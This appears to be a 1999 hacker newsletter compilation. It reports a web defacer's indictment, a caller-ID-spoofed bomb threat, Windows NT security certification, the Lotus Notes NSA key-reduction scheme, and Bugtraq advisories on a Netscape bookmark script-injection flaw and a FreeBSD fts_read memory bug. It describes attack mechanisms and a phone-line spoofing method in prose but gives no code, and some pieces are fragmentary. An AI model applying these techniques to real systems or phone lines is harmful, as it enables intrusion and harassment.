      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From HNN http://www.hackernews.com/
      
       Zyklon Busted 

      contributed by Space Rogue 
      
      HNN first reported this news early Friday morning and has now learned more details. Zyklon, 
      (Eric Burns) has now been charged with three counts of unlawful computer intrusion. The counts
      are believed to be for alleged attacks on the USIA (US Information Agency) web site, which as 
      hosted by Electric Press in Herndon, Va. Other companies allegedly attacked where LaserNet in 
      Fairfax, Va.; and Issue Dynamic Inc., which also has machines in VA. The total damage estimates
      are listed as $15,000. (Which seem a little low compared to other similar cases) It is believed
      that the Secret Service will also question Zyklon in connection to any involvement he may or may
      not have had in the recent whitehouse.gov crack.

     Alleged USIA site hacker indicted
     Grand jury hands down three counts of computer intrusion against Zyklon
     By Brock N. Meeks
     MSNBC

     May 14  A federal grand jury in Virginia Thursday charged a Washington state man, Eric Burns, with
     three counts of computer break-ins, including two high-profile hacks of the United States
     Information Agency. Burns, well-known in the electronic underground by his code name Zyklon,
     has also been questioned by the Secret Service in  conjunction with other government site break-ins,
     MSNBC has learned.
     
     BURNS CODE NAME, MENTIONED in court
     papers, taken from the poison gas used by the Nazis in concentration camps, was mentioned on the recent
     hack of the White House Web site in a shout out (hacker slang for words of praise for a fellow hacker).
     However, no details were available as to whether Burns was being questioned by the Secret Service in 
     conjunction with the White House hack.

      One source told MSNBC, after speaking with Burns, that the Secret Service questioned him about other
     government sites but not the White House hack.The Secret Service declined to comment. However, a
     source familiar with the investigation, which was carried out by the Computer Crimes Division of the 
     Federal Bureau of Investigation, confirmed that the bureau acknowledged another agency is also 
     investigating Burns.
     
     Calls to the FBI to discuss their investigation of Burns were not returned. The three alleged break-ins 
     charged to Burns took place from August of last year to January, according to court papers.
                                
      Attempts to contact Burns, who lives in Shoreline, Wash., by phone, were unsuccessful. One source who spoke
     to Burns said he was on a plane and heading for a court appearance in Virginia on Monday. 
     
      The three counts in the indictment are for attacks on the computers of Electric Press in Herndon, Va., which
     hosts the USIA Web site; LaserNet in Fairfax, Va.; and Issue Dynamic Inc., which has computers in Alexandria,
     Va., and
             
     Washington, D.C. Each count mentions damages of at least $5,000. The attack on USIAs web site in January was
     particularly damaging and was the second time it had been  allegedly hacked by Burns. Each of those hacks was
     signed by Zyklon. 
           
      USIA, which operates the Voice of America broadcasts, is an extremely busy site; its a clearinghouse for
     U.S. information and heavily used by foreigners. The first USIA hack, which occurred in August,
     destroyed a lot of the sites data, according to published reports at the time. The second break-in seemed to 
     be Burns way of working out his frustrations owing to a lost love.
     
     Hack by Zyklon. Crystal, I love, (you?) the hacked site said. In another Zyklon hacked site, this one of 
     BellSouth, he laments that he has massive depression, that hes a loser and that because of it I will never 
     have my Crystal I will never be happy and I hope I goto [sic] prison and die. 
                                
      Another hack attributed to Zyklon is that of the official Chinese human rights page, as seen on the Hacker News
     Network, which mirrors the hacked site. This hack appears to be an act of so-called hacktivism in which hackers 
     break into systems, own them and put up politically charged speech.

     Teen Hacker Indicted
     Zyklon Not Charged in White House Attack 
     By Ted Bridis
     The Associated Press
     
     W A S H I N G T O N,   May 15  A teen-ager identified as a computer hacker whose name appeared on the Internet
     site for the White House after vandals altered it this week has been indicted in Virginia on charges he broke
     into another government computer. A grand jury indicted Eric Burns, 19, on three counts of computer intrusion.
     Burns, reportedly known on the Internet as Zyklon, was accused of breaking into a computer between August 1998
     and January 1999 in northern Virginia that is used by the U.S. Information Agency. Zyklon was one of a dozen 
     names listed on the hacked version of the White House Web site, which was altered overnight Sunday for a few 
     minutes before government computers automatically detected the intrusion.

     A Serious Effort 
     
     The indictment returned Thursday also accuses Burns of breaking into two other computers, one owned by LaserNet
     of Fairfax, Va., and the other by Issue Dynamics of Washington. Sam Simon of Issue Dynamics said he was cooperating
     with the FBI. 
      
      We firmly believe that computer criminals need to be identified, prosecuted and caught, and were pleased that
     the FBI is not treating this as a minor matter. It wasnt an insignificant incident. It was a very concentrated,
     serious effort over a period of time.
      
      Burns was not charged in the attack on the White House computers.The opening page of the White House site was 
     altered briefly to show a black Web page with the names of the hacker organizations claiming responsibility, along
     with messages, Your box was own3d and Stop all the war.
      
      The page also included the phrase, following peeps get some shouts, and listed a dozen names, including
     Zyklon.

 11.0 IRC war and a Police HQ bomb threat send two headed for trouble..
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      CallerID Fooled In Omaha 


      contributed by hantai 
      A bomb threat was called in to the Omaha police headquarters recently. The Police responded to the
      address reported by CallerID. While the police where at that address another bomb threat was called 
      in from the same number. US West says that there are some "technical pieces of equipment" the criminals
      could use to make a phone call appear to come from someones number without actually being at that phone.
      (Yeah, it's called a butt set and telephone can on a street corner, real technical. Oh, and most of those
      cans aren't even locked) HNN has received reports that the perpetrators of this prank are known as 'port'
      and 'rottenboy' on IRC and did this in retaliation for not being opped on an IRC
      channel.

      Police investigate mystery 
      A threatening phone call has led police to a mystery and so far the clues have turned up
      nothing more than dead ends. 

      The call was made to Omaha police headquarters Thursday night: a bomb threat. 

      With caller I-D on police phones, the name and address of the alleged caller was quickly
      discovered 

      Police made their way to a northwest Omaha home. 

      Officer Don Savage says, "When they arrived,there they met a young man who said he had a
      feeling that the police would be coming to his house that night." 

      The young man had received an anonymous message on his computer telling him to expect
      a visit from the police. 

      While investigators were questioning the young man at his home, another call came in at police headquarters 
      from the same number and address. 

      Savage says, "911 contacted the sergeant on the scene at this house and asked 'is this the house?' And the 
      sergeant confirmed no one had made a phone call from that house. 

      Carla Ewert with U.S. West says, "There are some technical pieces of equipment that are available if someone's
      going to use the phone lines  dishonestly. And they technically could tap into someone's phone line
      from outside the house, never have to be in the person's home." 

      Ewart says it's virtually impossible for someone to use their computer to call in a threat from someone else's
      phone line. She says the connection between voice and data are separated. 

      Right now police aren't sure what the computer connection is, or how the scheme was carried out. 

      But a threat to their own house won't go unpunished. 

      Channel six news talked to the family who's phone line has been used in this scheme. They are also baffled as to 
      how their phone line was tapped. 

      Police say they intend to stay on the case until an arrest is made.

      UK Labels Windows as Secure 


      contributed by toka25 
      The U.K. Information Technology Security Evaluation Criteria (ITSEC), must have been hit on the head,
      dropped at birth, or be taking some really good drugs. Why? They have awarded Windows NT Server 4.0 and
      Windows NT Workstation 4.0 an E3/FC-2 rating. Microsoft says that this is "the highest security
      evaluation possible for a general-purpose operating system". Either this is all Microsoft spin or the 
      testers have never heard about things like pwdump or L0phtCrack. 

      Microsoft Propaganda

      April 29, 1999 

      U.K. government evaluation confirms security
      of Microsoft Windows NT 4.0 platform 
 
      Windows NT platform receives high security evaluation 
 
      LondonThe British government this week concluded that the
      Microsoft® Windows NT® platform passes muster when it comes to
      security. 
 
      After more than a year of intensive testing, the U.K.
      Information Technology Security Evaluation Criteria
      (ITSEC) certification board has awarded Windows NT
      Server 4.0 and Windows NT Workstation 4.0 an
      E3/FC-2 ratinggenerally acknowledged as the
      highest security evaluation possible for a
      general-purpose operating system. The security
      standards agency evaluation included examinations of the source
      code and design documentation of Windows NT 4.0 with Service Pack
      3. Testers also had direct access to the engineers who designed and
      tested the server operating system. 
       
      Their conclusion: the Windows NT 4.0 architecture provides robust
      but flexible security. 
       
      "The successful ITSEC evaluation confirms the robust security and
      design of Windows NT," said Edmund Muth, group product manager at
      Microsoft. "The strong security and wide range of security-related
      features in Windows NT benefit customersboth those in industries
      where security is a paramount concern, like banking, government,
      healthcare and the militaryand individuals who are concerned about
      their privacy and e-commerce." 
       
      The comprehensive security architecture in the Windows NT platform
      provides that level of safety. Its integrated security features include
      strong authentication, fine-grained access control, real-world auditing
      tools and secure communications. 
       
      Governments and enterprises around the world have already put
      those features to use. 
       
      Last Fall, Brazil used a Windows NT-based network to securely host
      the largest electronic elections in history. Requiring the highest level
      of security, nearly 90 percent of NATO's headquarters and field sites
      in Europe and the United States use a Windows NT-based system to
      deliver tactical data and military messaging. 
       
      And in the private sector, one of New Zealand's largest banks counts
      on Windows NT to provide secure banking over the Internet. 
       
      The ITSEC rating provides independent confirmation of the platform's
      security features. ITSEC is the only evaluation scheme recognized by
      the British government for use in secure and sensitive installations. It
      is also officially recognized by the governments of many European
      Union countries, Canada, the former Soviet republics and, with slight
      variations, in New Zealand and Australia. 
 
      The E3/F-C2 evaluation is roughly equivalent to a
      C2 evaluation under the U.S. Trusted Computer
      Security Evaluation Criteria (TCSEC) regime,
      better known as the "Orange Book." Microsoft is
      separately pursuing a C2 evaluation for Windows NT 4.0, which is
      expected to be completed shortly. 
       
      But security isn't the only thing this platform offers. 
       
      The multipurpose server operating system that forms the foundation
      of the BackOffice® family, Windows NT Server 4.0 offers a
      comprehensive set of services. From communications and file and
      print services to a platform for building and hosting Web- and
      client-server-based applications, Windows NT Server is built to meet
      the many needs of business. 
       
      Windows NT Workstation 4.0, developed specifically for the business
      environment, makes it easy to use, manage and integrate those
      features. The operating system gives employees the intuitive look and
      feel of Windows® 98, so companies can cut training costs, and
      people can work productively right from the start. 
       
      The Windows NT platform is also the quickest path to Windows 2000,
      which is designed to be Microsoft's most robust and reliable operating
      system to date. Windows 2000 is also designed with security in mind.
      Microsoft is taking orders for the Beta 3 versions of Windows 2000
      Server and Workstation. 
       
      After Microsoft releases Windows 2000, the company plans to submit
      the operating system for a similar security evaluation under the
      Common Criteria, a new evaluation system that will consolidate the
      TCSEC and ITSEC criteria. 
       
      The results of which could further the Windows platform's reputation
      of providing secure computing.

 16.0 Vulnerability in Netscape bookmarks found by George Guninski...     
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Date: Sun, 16 May 1999 17:17:34 +0300
      From: Georgi Guninski <joro@NAT.BG>
      To: BUGTRAQ@netspace.org
      Subject: Netscape Communicator bookmarks <TITLE> security vulnerability
      
      There is a security bug in Netscape Communicator 4.51 Win95, 4.07 Linux
      (guess all 4.x versions are affected) in the way they handle special
      bookmarks
      with JavaScript code in the title.
      
      If you enclose a JavaScript code with <SCRIPT> tags in the <TITLE>
      tag and bookmark that page, the JavaScript code is written in the local
      bookmarks file.
      Then when the bookmarks file is open, the JavaScript code is executed in
      the security
      context of a local file - the bookmarks file.
      The bookmarks file may be open by a script, probably a server redirect
      or by the user.
      The bookmarks file name must be known, but it is easily guessed for most
      dialup
      users.
      
      Vulnerabilities: reading user's bookmarks, browsing local directories,
      reading local files (works fine on Linux, probably possible on Windows).
      
      Workaround: Disable JavaScript or do not bookmark untrusted pages.
      
      Demonstration is available at: http://www.nat.bg/~joro/book2.html

 17.0 Lotus Notes in bed with the NSA on encryption keys

      Spying on the Spies
      by Niall McKay 
      
      12:15 p.m.  10.May.99.PDT
      The National Security Agency has its ear to the world, but doesn't listen to everyone at once. 
      
      That was one conclusion of a new report, Interception Capabilities 2000, accepted late last week by the European Parliament's Science and Technology Options Assessment Panel (STOA). 
      
      The panel commissioned Duncan Campbell, a British investigative reporter, to prepare a report on Echelon, the US-led satellite surveillance network. 
      
      "I have no objection to these systems monitoring serious criminals and terrorists," said Glyn Ford, a British Labour Party member of parliament and a committee member of STOA. "But what is missing
      here is accountability, clear guidelines as to who they can listen to, and in what circumstances these laws apply." 
      
      Campbell was asked to investigate the system in the wake of charges made last year in the European Parliament that Echelon was being used to funnel European government and industry secrets into US
      hands. 
      
      "What is new and important about this report is that it contains the first ever documentary evidence of the Echelon system," said Campbell. Campbell obtained the document from a source at Menwith
      Hill, the principal NSA communications monitoring station, located near Harrogate in northern England. 
      
      The report details how intelligence agencies intercept Internet traffic and digital communications, and includes screen shots of traffic analysis from NSA computer systems. 
      
      Interception Capabilities 2000 also provides an account of a previously unknown, secret international organization led by the FBI. According to Campbell, the "secret" organization, called ILETS
      (International Law Enforcement Telecommunications Seminar), is working on building backdoor wiretap capabilities into all forms of modern communications, including satellite communications
      systems. 
      
      "[The report] is undoubtedly the most comprehensive look at Echelon to date because of its attention to detail -- [and] the NSA's use of technology," said John Young, a privacy activist in New York. 
      
      Although the United States has never officially acknowledged Echelon's existence, dozens of investigative reports over the past decade have revealed a maze-like system that can intercept telephone,
      data, cellular, fax, and email transmissions sent anywhere in the world. 
      
      Previously, Echelon computers were thought to be able to scan millions of telephone lines and faxes for keywords such as "bomb" and "terrorist." But Campbell's report maintains that the technologies
      to perform such a global dragnet do not exist. 
      
      Instead, Campbell said that the system targets the communications networks of known diplomats, criminals, and industrialists of interest to the intelligence community. 
      The report charges that popular software programs such as Lotus Notes and Web browsers include a "back door," through which the NSA can gain access to an individual's personal information. 
      
      Citing a November 1997 story in the Swedish newspaper, Svenska Dagbladet, the report said that "Lotus built in an NSA 'help information' trapdoor to its Notes system, as the Swedish government
      discovered to its embarrassment." 
      
      The report goes on to describe a feature called a "workfactor reduction field" that is built into Notes and incorporated into all email sent by non-US users of the system. The feature reportedly
      broadcasts 24 of the 64 bits of the key used for each communication, and relies on a public key that can only be read by the NSA. 
      
      Lotus could not be reached for comment. 
      
      The new report emerges as politicians on both sides of the Atlantic are growing increasingly concerned about Echelon and its capabilities. 
      
      "I believe that it's time that there is some congressional scrutiny of the Echelon project and I am examining a way to do that," said Representative Bob Barr (R-Georgia). "I understand the need for
      secrecy -- I was with the CIA myself -- but Echelon has raised some questions about fundamental policy and constitutional rights." 
      
      Barr is concerned that the NSA is using its Echelon partners to help it sidestep laws that forbid the US government from spying on its own people. 
      
      So far, there has been very little scrutiny of spy systems in the United States, according to Patrick Poole, a privacy advocate and lecturer in government and economics at Bannock Burn College in
      Franklin, Tennessee. 
      
      "The only significant examination of spy systems in the United States was the Church Report, which was prompted by Watergate in the early '70s," said Poole. "I hope that Europe's interest in the
      Echelon system will spark some new debate in the US." 
      
      Echelon is believed to be principally operated by the NSA and its British counterpart, the Government Communications Headquarters. The system also reportedly relies on agreements with similar
      agencies in other countries, including Canada's Communications Security Establishment, Australia's Defense Signals Directorate, and New Zealand's Government Communications Security Bureau.

      Hello,
        1st off please don't publish my name on your site.  I'm too lazy to
      set up another cheezy mail acct.
        Today I downloaded cryptography/nsa/lotus.notes.backdoor.txt from
      your site.  I have a close friend who is a developer for Iris (the
      people who make Notes for lotus.)  I sent him the file I downloaded and
      asked him what the deal was, and here's his response:
      
      Here's the necessary info to truly understand the issue here; a speech by Ray
      Ozzie and Charlie Kaufman's white paper on the topic. What it comes down to is
      that notes provides superior exportable encryption technology when compared to
      other US products on the market. For anyone (but the NSA) to crack our
      international encryption keys they must crack a 64 bit key, the same as with a
      US encryption key. In the international version we take 24 of the 64 bit
      encryption key and encrypt the 24 bits with the NSA's public key and send it,
      encrypted strongly, along with the encrypted message. This means the NSA can
      decrypt with their key and have 24 of the 64 bit key. They still have to break
      the remaining 40 bits. 40 bit key encryption has been the max for exportable
      encryption and that is what all other US exportable encryption providers 
      allow.
      That limit has just been raised to 56 bits and we are incorporating that as I
      type. In the worst case: the NSA's private key is compromised, the 40 bit
      portion of the key still must be cracked. So we haven't weakened the security 
      of international encryption, but actually made it equal to the US security (to
      everyone but the NSA). We are proud of this arrangement because we have found 
      a way to make Notes as secure as the US government will allow for our
      international customers. If we hadn't used this technique all of the
      international notes encrypted data would be with only a 40 bit key. As it
      stands, the 64 bit key used in both US and international encryption is 
      extremely secure.
      
      It's too bad the author of this article choose to attack Lotus Notes without
      considering the options the US government provides. We could  have just 
      shipped 40 bit encryption like MS, Netscape, etc. and leave our international 
      customers with weak encryption but we didn't. Oh well, you can't make everyone 
      understand, this confusing and frustrating stuff. I hope this helps.

      SAN FRANCISCO, Jan. 17, 1996 -- As we're all painfully aware, the U.S.
      government continues to maintain that cryptography should be
      classified and controlled as a munition of war -- and for good
      historical reason: Some of cryptography's finest hours have been
      during past wars.
      From the government's standpoint, the export controls implied by
      munitions classification must be working very well, since there has
      been no mass-deployed worldwide cryptography, most general
      communications is still in cleartext, and no world of unbreakable
      crypto has emerged.
      In the meantime, while we're preoccupied by protecting the flow of
      bits across borders, trouble is brewing. Criminals don't recognize
      borders but operate in one wild-and-wolley network. Crackers are able
      to attack targets halfway around the world with no fear of
      prosecution. Exceptionally smart people in Eastern Europe crack
      financial systems in New York.
      Everywhere you look, bright, clever people are breaking into
      communication systems, industrial control systems, transportation
      systems, health care systems -- anything and everything that's
      controlled by networked computers. And as you know, this isn't a
      theoretical problem, or just a problem with clever people stealing
      money from banks; it's a "clear and present danger" that's a direct
      result of our having moved into the information age without adequately
      securing our information and our global information systems.
      This is not just an issue of signals Intelligence or of Title III
      wiretaps or of lost software industry profits; this is a public safety
      issue.
      One of these days, someone is going to bring down an airliner
      somewhere in the world, or cause a train wreck, or destabilize an
      economy, by breaking into an information system through the worldwide
      net. And it may be something that we could have prevented, if we had
      been making more casual and widespread use of cryptography.
      And that's why I, and a number of you, spend so much time trying to
      change the system -- trying to educate, to help convince the U.S.
      Government to liberalize export controls, to allow our customers
      worldwide to have access to good security, to protect themselves
      against the threats present on the worldwide networks.
      To be sure, the customers are getting more and more astute. Due in
      large part to the press surrounding the cracking of a few 40-bit RC4
      keys last year, our customers have lost confidence in 40-bit crypto.
      They told us that, if we were going to continue to market 40-bit Lotus
      Notes overseas, we should stop marketing it as a secure system -- that
      we should start to call it "data scrambling" or "data masking" instead
      of encryption. And so we have continued to lobby, arguing that the
      benefits of substantially better exportable crypto outweigh the risks.
      The government's response? Well, their latest proposal might -- in
      theory -- allow us to ship a 64-bit product overseas so long as it had
      third-party key escrow features built in. We talked to our customers
      about the administration's proposal, and the answer was very clear:
      our customers have said a resounding "no" to key escrow in Lotus
      Notes.
      They simply don't like the notion that they can't compute the
      additional risk and liability introduced by a third party holding the
      keys to unlock their data. Well, that left us in a bind.
      We need to provide better security for our international customers,
      but the government's proposal was clearly unacceptable to them.
      And because I didn't see a "silver bullet" solution -- or general
      export relief -- in the cards, I began looking for an interim solution
      that might allow us to ship a more secure product in the short term,
      while we continued to argue for substantial revision of national
      cryptography policy.
      And after months of negotiation, I'm here to announce that we have
      found a short-term workaround to the problem, which I hope you will
      find to be an interesting, new development in the area of cryptography
      as it pertains to export controls.
      While this is a very tough issue, and while I personally believe that
      a world of widespread cryptography is truly inevitable, the name of
      the game right now is to find a compromise solution that satisfies the
      stated needs of the U.S. Government, while still providing good
      information security.
      This is just such a compromise.
      Lotus Notes Release 4, which is now shipping, utilizes a new method of
      security that we're referring to as "Differential Workfactor
      Cryptography." It is a conceptually simple solution that addresses two
      problems at the same time: First, it protects sensitive corporate
      information from most malicious crackers far more effectively than
      previously exported products; second, it permits the government to
      retain its current level of access to encrypted information carried by
      U.S. products overseas.
      No more access, no less access.
      As you know, the U.S. government has defined its "maximum tolerance
      level" for exportable unescrowed cryptography at 40 bits. That is,
      because they generally permit the export of 40-bit products, the U.S.
      government is clearly already willing to deal with a 40-bit work
      factor in order to examine encrypted communications outside of this
      country.
      So, the system that we're shipping in Lotus Notes Release 4 overseas
      is one that presents different work factors to different parties,
      hence the name.
      Against crackers -- against the run-of-the-mill adversary trying to
      break a message -- the work factor is 64 bits, just like it is in the
      U.S. That is, in the new International Edition of Lotus Notes, bulk
      data keys are now 64 bits just as they are in our North American
      Edition that's sold in the U.S. and Canada.
      But when the U.S. Government needs access to a communications stream
      overseas encoded by the international edition of Lotus Notes, they are
      no worse off - and no better off - than they are today - they have to
      crack 40 bits.
      So how can this be true, when the work factor is 64 bits for
      non-governmental adversaries? It's pretty simple. We asked the
      government to generate a special RSA key pair, and to make known their
      RSA Public Key. We asked them to keep their private key classified,
      compartmentalized -- as secret as they'd keep the keys to their own
      military and diplomatic communication systems -- and to never disclose
      it to anyone.
      Then, we changed Notes so that whenever the product generates an
      encrypted 64-bit bulk data key, bound to that key is a small package
      -- a "workfactor reduction field" -- containing 24 bits of the bulk
      data key encrypted with the U.S. government's public key. So the U.S.
      government has exclusive access to 24 of the 64 bits.
      That's 64 bits against the cracker, 40 bits for the government.
      And, of course, this version of Notes is fully interoperable with the
      North American Edition of Notes, the only version that we sell in the
      United States.
      In the North American Edition, as always, keys generated for
      communications within the U.S. and Canada aren't subject to any kind
      of work factor reduction. And both the North American Edition and the
      International Edtion are shipping today.
      We are very pleased that we are now able to offer this increased level
      of security to our overseas customers. And I encourage you out there
      -- product designers and developers who are in a similar bind -- to
      offer stronger confidentiality features to your customers in your
      exported products by taking advantage of our already having negotiated
      export approval for this Differential Workfactor implementation.
      But please make no mistake about it: We fully recognize that this is a
      compromise solution. This is not a panacea. This is not the "silver
      bullet" that addresses all needs.
      We continue to argue vigorously that global and national economic
      security, domestic law enforcement related to Information security
      crimes, and personal privacy concerns would all be served well by the
      rapid and broad, worldwide proliferation of good, strong, high-grade
      cryptography. And we continue to push for a complete and public review
      of national cryptography policy.
      But we relish the fact that, in today's highly-charged political
      climate surrounding the issue of cryptography, we were able to
      negotiate a solution that increases information security for our
      worldwide customers. By throwing another potential solution into the
      mix -- by leading the way for others by clearing its export approval
      -- we hope that this stirs debate related to national cryptography
      policy.
      A debate that is both global and local in nature; a debate that, with
      your help, we can hopefully bring to the attention of the U.S Public.

      Differential Workfactor Cryptography

      January 17, 1996
      
      Abstract: This document describes the technical approach behind the
      exportable strong cryptography included in Lotus Notes Release 4
      (International Edition). Current U.S. export regulations generally prohibit
      the export of cryptographic software that uses keys larger than 40 bits,
      but advances in processor technology make 40 bit keys breakable by
      exhaustive search practical for a growing collection of potential
      attackers. In a novel scheme we sometimes refer to as 64/40, we provide
      the cryptographic strength of 64 bit keys against most attackers while to
      comply with export regulations we make the workfactor for breaking the
      system equivalent to only 40 bits for the U.S. government. We do that
      by encrypting 24 of the 64 bits under a public RSA key provided by the
      U.S. government and binding the encrypted partial key to the encrypted data.
      
      Background: As we're all painfully aware, the U.S. government continues
      to maintain that cryptography should be classified and controlled as a
      munition of war. There is a long historical basis for this - some of
      cryptography's finest hours have been during the wars of the past. And
      while some would argue that export controls are a sham because many
      foreign governments impose no such restrictions and we participate in an
      international marketplace, by one very important measure export controls
      have been a success: no mass-deployed worldwide cryptography has emerged
      and most general communications is still in cleartext.
      
      But while the government has been successfully defending its ability to
      spy, trouble has been brewing. Criminals don't recognise borders -
      there's
      only one wild and wooly network. Crackers are able to attack targets
      halfway around the world with no fear of prosecution. Smart people in
      Eastern Europe crack financial systems in New York. Everywhere you
      look, bright clever people are breaking into communication systems,
      industrial control systems, transportation systems, health care systems, 
      anything and everything that's controlled by networked computers. This is 
      not a theoretical problem, or just a problem with clever people stealing
      money from banks; it's a clear and present danger that's a direct result of
      the fact that we've moved into the information age without adequately
      securing our global information systems.
      
      Lotus Notes has been a pioneer in providing transparent strong RSA based
      cryptography in its product offering. It went to great lengths to provide
      the strongest protection legally permissable. There is an International
      Edition that complies with export regulations and a domestic edition that
      does not (called the North American Edition because it is legally available
      in the U.S. and Canada). In the International Edition, users use two RSA
      key pairs - one used to protect data integrity and authentication and
      another (shorter) one to protect data confidentiality because only data
      confidentiality key sizes are regulated by export controls. Full
      interoperability between the North American and International Editions is
      achieved by having the two ends negotiate down to the largest key size that
      both ends support. This design came at no small cost, but it was the only
      way we could deliver the best security possible to each of our customers
      given the existing regulatory climate.
      
      Differential Workfactor Cryptography is another innovation in the direction
      of giving our customers the best security we can while continuing to oppose
      the regulations that make the complexity necessary.
      
      How it works: The idea behind Differential Workfactor Cryptography is
      simple; whenever a bulk data key is created, a 64 bit random number is
      chosen. If the use of that key is one involving data confidentiality and
      the International Edition of Notes, 24 of the bits are encrypted under a
      public RSA key that was provided to us by the U.S. government and the
      result - called a Workfactor Reduction Field - is bound into the encrypted
      data. There is no Workfactor Reduction Field in data used only by the
      domestic edition of Notes, and there is none for keys that are not used
      for data confidentiality (e.g. those used for authentication).
      
      If an attacker wanted to break into a Notes system based on information
      obtained by eavesdropping, he would have to exhaustively search a 64 bit
      key space. Even the U.S. government would face this workfactor because
      there is no Workfactor Reduction Field in keys used for authentication.
      An attacker who wanted to read an encrypted document that was either read
      from a server or eavesdropped from the wire would face a 64 bit workfactor.
      But if the U.S. government needed to decrypt such a document it could
      obtain 24 of the bits using its private key and the Workfactor Reduction Field
      and then exhaustively search a 40 bit key space.
      
      Tamper resistance: You might wonder what's to prevent someone from deleting
      the Workfactor Reduction Field from a document or the setup protocol of a
      network connection. This is similar to the problem faced in the Clipper
      design to assure that the LEAF field was not removed from a conversation.
      In a software only implementation, it is not possible to prevent tampering
      entirely. The easiest form of tampering would be to smuggle the North
      American Edition CD out of the U.S. or pass it to someone over the
      Internet. The best a software implementation can do in terms of tamper
      resistance is to make it impossible to remove the Workfactor Reduction
      Field without modifying both the source of the data and the destination..
      This can be done by having the destination check for the presence of the
      Workfactor Reduction Field and refuse to decrypt the data if it is not
      there or not correct. The destination can't decrypt the Workfactor
      Reduction Field to check it, but knowing the bulk data key and the
      government public key, it can regenerate the WRF and compare the result
      with the supplied value. RSA has the convenient property that the same
      value encrypted twice produces the same result; it would be somewhat more
      complex (but still possible) to duplicate this functionality with other
      public key algorithms. [Note: for this to work, the random pad that was
      used in creating the WRF must be delivered to the recipient of the message.
      For it to be secure, it must be delivered encrypted since a clever attacker
      who knew the pad could do 2^24 trial encryptions to get 24 bits of the key
      and then do 2^40 trial decryptions to recover the rest.]
      
      
      
      Frequently Asked Questions:
      
      Q: Does this mean that the International Edition of Lotus Notes Release 4
      is just as secure as the North American Edition against someone who does
      not know the U.S. Government's key.
      
      A: Almost. There are factors other than the 64 and 40 bit secret keys.
      The International Edition is still limited to 512 bit RSA keys when they
      are used for data confidentiality. The North American Edition uses 630 bit
      RSA keys in this context. While 512 bit RSA keys are considerably more
      secure than 40 bit secret keys, they are not as secure as 64 bit keys, so in
      both cases it would be more cost effective to attack the RSA keys than to
      attack the secret keys. In considering the security of the International
      Edition, users must also assess the likelihood that an attacker might learn the
      government's private key either by breaking through the government's
      protective mechanisms or by breaking the single RSA key. If either were
      to happen, the International Edition would become only as secure as other
      40 bit products.
      
      Q: Does Lotus also have a copy of the private key used to reduce the
      workfactor from 64 to 40 bits?
      
      A: No. The U.S. government generated the RSA key and supplied us with
      the public component. We never had access to the private component (which
      made debugging this thing a real joy!).
      
      Q: How is this scheme different from Key Escrow?
      
      A: While one goal may be the same - to provide exportable strong
      cryptography - there are differences with respect to security,
      functionality, and administrative convenience. It is more secure than
      Key Escrow in that even if third parties misbehave, there remains a
      substantial workfactor in breaking each individual message. It may be 
      more or less secure than Key Escrow depending on the policies of the 
      holder of the U.S. government key compared to the policies of possible 
      Key Escrow agents.  It is less functional than some Key Escrow proposals 
      because it is impractical to use this facility to recover lost keys. And 
      it is more administratively convenient than key escrow because there is no 
      communication with third parties necessary as part of setup. Notes is 
      secure 'out of the box'.
      
      Q: Does this scheme address law enforcement concerns within the U.S.
      (i..e.  should it be considered an alternative to Clipper)?
      
      A: No. In only one way does this scheme address the Law Enforcement
      interests of either U.S. or foreign governments: better information
      security helps Law Enforcement to guard against information-related crimes.
      As indicated by our continuing to go to considerable expense to maintain
      both domestic and international editions, we continue to oppose any
      limits on domestic use of strong cryptography.

      execorder.txt - Last week, I received a copy of an "Executive Order" from The White House,
      signed by President Clinton, along with several emails informing me that it is now illegal
      for me to "provide any software or technology to Yugoslavia and Montenegro". In other words, 
      I was told that I need to restrict access to this web site so that anybody from the .yu TLD 
      could not access and download "exploits" and "hacker tools". It was suggested that I deny 
      access to anybody using proxies, anonymizers, non-resolvable IP addresses, and of course 
      anybody from Yugoslavia. This is absurd. Here is my "Executive Reply" to President Clinton:
      Fuck you and your stupid orders, Bill.

      12345 I've put together a list of all trojans known to me and the default

      To help anyone to detect trojan attacks, I´m planning to add information
      about the original names of the executables, their size, where they usually
      are hiding, and the names of any helpfiles they may use. I will also add
      tools or links to tools that may be of your assistance.
      
      Feel free to get back to me with any comments or suggestions. If you find
      new trojans I´ll love to get my hands on them, but please mail me first, as
      I don´t need more than one copy. If you have live experiance of trojan
      attacks I´m interested to read about your findings.

 20.0 Fts_read vulnerabilty provides root compromise in FreeBSD find, du 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      Date: Wed, 12 May 1999 14:32:42 +0400
      From: Stas Kisel <stas@SONET.CRIMEA.UA>
      To: BUGTRAQ@netspace.org
      Subject: fts, du, find
      
      Hi.
      
      I use FreeBSD-2.2.8 and FreeBSD-2.2.7 and I know that these versions are
      no longer supported, but:
      1. There are many people still using 2.2
      2. This bug probably applies to FreeBSD-3.1 and ever to OpenBSD and other.
      
      Approximately a month ago I've found a very strange behaviour of 'du'
      with long direstory structures. I left this alone due to lack of time,
      but some days ago I saw an article on bugtraq concerning similar
      behaviour of 'find'.
      
      There is a one bug in libc causing this behaviour. I have a patch, but
      I did not tested it much ;)
      
      Both 'find' and 'du' use 'fts' (fts_read,...) functions to traverse
      directory structure.
      fts uses realloc() to reallocate memory in quite complex lists.
      There is a bug in adjusting pointers after realloc().
      So when dealing with large directory structures (when realloc() needed),
      some pointers can point to free()-ed memory.
      
      I have no exploit and probably will no have a free time (I think
      3 days is more than enough) for doing it, but I beleive it is
      possible to exploit this bug using carefully designed directory
      tree to execute arbitrary commands as root during
      /etc/daily->/etc/security->find.
      REMOTE ROOT EXPLOIT (POSSIBLE).
      At least it is possible to hide setuid binary this way in home dir or in /tmp.
      
      The following patch is designed for FreeBSD-2.2.8-RELEASE libc.
      There was the following ID in the beginning of the source file.
      /*      $OpenBSD: fts.c,v 1.9 1997/08/02 00:13:49 millert Exp $ */
      I've only tested this patch on one machine during one day, so
      it is probably buggy.
      If you'll apply this patch, please drop me a line if there was any side effect
      and I'll do a followup in the bugtraq, say, on the Friday.

      I found this back a few months ago when working on the wu-ftp stuff..
      OpenBSD definitely has the same problem.  last thing I remember thinking
